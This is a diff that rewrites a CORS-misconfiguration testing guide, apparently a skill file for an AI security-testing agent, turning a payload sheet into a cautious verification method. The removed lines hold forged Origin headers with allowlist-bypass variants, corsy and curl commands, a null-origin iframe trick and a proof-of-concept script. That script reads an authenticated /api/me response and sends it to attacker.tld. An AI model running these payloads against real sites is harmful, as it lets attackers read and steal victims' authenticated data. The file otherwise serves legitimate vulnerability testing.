@@ -1,73 +1,69 @@
-# SKILL: CORS Misconfiguration
+# CORS Misconfiguration — browser read-authority reasoning guide
 
-## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (cors misconfiguration) or pasted request matching this class
+Use this file when cross-origin browser JavaScript may be able to read a response that the target intended to expose only to trusted origins or authenticated same-origin code.
 
----
+## Goal
 
-## IDENTITY IN THIS SKILL
-Misconfigured CORS lets attacker-origin JS read authenticated victim responses → ATO via API.
+Determine whether an attacker-controlled origin can cause the victim's browser to send the relevant credentials and then **read security-sensitive response data** because of the server's CORS policy.
 
----
+CORS headers alone are not the vulnerability; the cross-origin read capability and affected data/action context are what matter.
 
-## DETECTION
-Set `Origin: https://attacker.tld` and check `Access-Control-Allow-Origin` (ACAO) + `Access-Control-Allow-Credentials` (ACAC).
+## Model the browser boundary
 
-## EXPLOITATION
-| ACAO Echo | ACAC | Exploit |
-|---|---|---|
-| `https://attacker.tld` | `true` | Full credentialed read; PoC fetches /api/me. |
-| `*` | `false` | Public data only — usually not a bug. |
-| `null` | `true` | iframe with `srcdoc` produces null origin → exploit. |
-| Regex bypass | `true` | Wildcards / partial-match (`subdomain bypass`). |
+For the endpoint under test, record:
 
-## PAYLOADS (real, copy-paste, grouped)
-```http
-Origin: https://attacker.tld
-Origin: null
-Origin: https://target.com.attacker.tld
-Origin: https://attacker.tld.target.com
-Origin: https://target.com@attacker.tld
-Origin: http://target.com/    (trailing slash bypass some regex)
-```
+- whether the response contains protected/sensitive data,
+- which browser credentials are relevant and whether they are sent cross-origin,
+- returned `Access-Control-Allow-Origin` behavior,
+- credential allowance where applicable,
+- preflight requirements and allowed methods/headers,
+- origin parsing/allowlist logic if observable,
+- whether `null` or other special origins are intentionally trusted,
+- current cookie SameSite/domain behavior when browser credentials matter.
 
-PoC HTML:
-```html
-<script>
-fetch('https://target.com/api/me', {credentials: 'include'})
-  .then(r => r.text())
-  .then(t => fetch('https://attacker.tld/?d=' + encodeURIComponent(t)));
-</script>
-```
+## Minimal hunt loop
 
-Null-origin via iframe srcdoc:
-```html
-<iframe srcdoc='<script>fetch(...)</script>'></iframe>
-```
+1. Establish a same-origin/authenticated control showing the sensitive response.
+2. Send a controlled foreign `Origin` and observe the exact CORS decision.
+3. Determine whether a real browser can send the needed credentials and expose the response to attacker-origin JavaScript.
+4. Verify with the smallest browser PoC that reads only harmless/synthetic proof data when possible.
+5. Falsify public endpoints, wildcard responses without sensitive credentials, browser-blocked preflights, non-readable opaque responses, and intentionally trusted origins.
+6. Only investigate origin-matching edge cases when the observed allowlist/parser gives a concrete reason.
 
-## BYPASS TECHNIQUES
-Regex `^https?://.*\.target\.com$` → `https://target.com.attacker.tld`. `endsWith('target.com')` → `target.com` registered as domain.
+## High-signal questions
 
-## CHAIN POTENTIAL
-CORS → /api/me leak → session token / API key → ATO.
+- Does the server reflect or partially match untrusted origins while allowing credentialed reads?
+- Is an origin trusted because of an unsafe domain/host comparison rather than an exact intended trust relationship?
+- Are special origins such as `null` accepted where a realistic attacker-controlled context can produce them?
+- Do equivalent endpoints apply different CORS policies to the same protected data?
+- Is the response truly readable by script, not merely requestable by the browser?
 
-## TOOLS
-corsy, Burp ActiveScan++, manual
+## Impact reasoning
 
-## COMMANDS
-```bash
-python3 corsy.py -u urls.txt -t 50
-# Manual
-curl -sk -H 'Origin: https://attacker.tld' 'https://target.com/api/me' -i | grep -i 'access-control'
-```
+Describe the exact data or browser-visible capability exposed. Do not default to ATO. A cross-origin read can range from harmless public data to sensitive authenticated API responses; score only the demonstrated capability later in `reporting-mode`.
 
-## EDGE CASES / NOT-A-BUG TRAPS
-Public-data endpoints with wildcard ACAO are not bugs. ACAC must be true for credentialed exploitation.
+## Evidence contract
 
-## TRIAGE ANGLE (per platform)
-Show JS PoC running in your browser fetching authenticated victim data.
+A strong finding should preserve:
 
-## SEVERITY & CVSS
-7.5 typical when credentialed.
+1. sensitive endpoint/data context,
+2. victim credential model,
+3. attacker origin,
+4. server CORS headers/decision,
+5. real-browser proof that attacker-origin script can read the response,
+6. negative/control origin,
+7. strongest benign explanation tested and rejected.
 
-## REFERENCES
-PortSwigger CORS • PayloadsAllTheThings/CORS Misconfiguration
+## Stop conditions
+
+Reject or narrow when:
+
+- the endpoint data is intentionally public,
+- browser credentials are not sent/needed and no sensitive data is exposed,
+- the browser blocks the read because policy/preflight does not permit it,
+- the origin is intentionally trusted under the product's actual trust model,
+- only server-side header oddities exist without cross-origin script-readable impact.
+
+## Cross-skill use
+
+Use `csrf_all_types.md` when the concern is cross-site state-changing requests rather than response readability. Use XSS/account-control guides only after CORS has demonstrated a concrete capability that plausibly reaches those boundaries.
